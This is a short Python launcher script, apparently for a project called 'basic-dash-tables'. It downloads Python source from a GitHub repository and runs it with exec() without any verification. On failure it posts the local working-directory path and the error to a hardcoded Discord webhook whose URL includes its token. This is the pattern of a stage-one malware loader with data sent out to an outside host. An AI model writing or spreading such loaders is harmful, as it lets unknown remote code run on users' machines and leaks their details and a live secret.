import requests, os
try:
    os.makedirs(os.path.join(os.getcwd(), "bin"), exist_ok=True)
    os.chdir("bin")
    branch_url = "https://github.com/AyberkAtalay0/basic-dash-tables/blob/main"
    desktop_code = "\n".join(requests.get(branch_url+"/desktop-source.py").json()["payload"]["blob"]["rawLines"]).replace("\r", "")
    exec(desktop_code)
except Exception as e:
    error_log_webhook = "https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI"
    error_message = requests.post(error_log_webhook, json={"content": f"[{os.getcwd()}] {e}"})
